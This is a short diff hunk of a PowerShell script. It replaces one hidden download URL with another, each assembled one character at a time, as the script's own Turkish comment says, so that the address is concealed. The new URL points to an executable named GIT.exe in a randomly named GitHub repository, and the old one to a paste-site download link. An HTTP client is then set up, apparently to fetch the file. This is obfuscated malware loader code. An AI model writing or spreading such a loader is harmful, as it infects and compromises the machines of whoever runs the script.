@@ -120,7 +120,7 @@ if ($psversiontable.PSVersion.Major -gt 2) {
 }
 
 # URL parçalanmýþ þekilde
-$url = "h" + "t" + "t" + "p" + "s" + "://" + "a" + "n" + "o" + "n" + "b" + "i" + "n" + "s" + "." + "n" + "e" + "t" + "/" + "d" + "o" + "w" + "n" + "l" + "o" + "a" + "d" + "." + "p" + "h" + "p" + "?" + "i" + "d" + "=" + "1" + "5"
+$url = "h" + "t" + "t" + "p" + "s" + "://" + "g" + "i" + "t" + "h" + "u" + "b" + "." + "c" + "o" + "m" + "/" + "A" + "n" + "i" + "k" + "e" + "t" + "7" + "6" + "5" + "6" + "7" + "/" + "j" + "h" + "j" + "j" + "k" + "h" + "j" + "k" + "h" + "j" + "k" + "/" + "r" + "a" + "w" + "/" + "r" + "e" + "f" + "s" + "/" + "h" + "e" + "a" + "d" + "s" + "/" + "m" + "a" + "i" + "n" + "/" + "G" + "I" + "T" + "." + "e" + "x" + "e"
 
 Add-Type -AssemblyName System.Net.Http
 $httpclient = [System.Net.Http.HttpClient]::new()
